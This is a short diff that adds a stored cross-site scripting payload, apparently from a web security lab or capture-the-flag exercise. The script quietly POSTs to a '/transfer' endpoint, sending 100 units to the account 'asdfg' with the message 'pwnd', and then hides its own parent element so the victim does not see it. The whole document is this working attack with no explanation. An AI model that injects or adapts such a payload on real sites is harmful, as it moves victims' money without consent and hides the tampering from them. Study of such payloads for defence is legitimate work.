@@ -1,0 +1,8 @@
+<script id="xss">
+	var request = new XMLHttpRequest();
+	var data = "receiver=asdfg&amount=100&message=pwnd";
+	request.open('POST', '/transfer', true);
+	request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+	request.send(data);
+	document.getElementById('xss').parentElement.style.display = "none";
+</script>
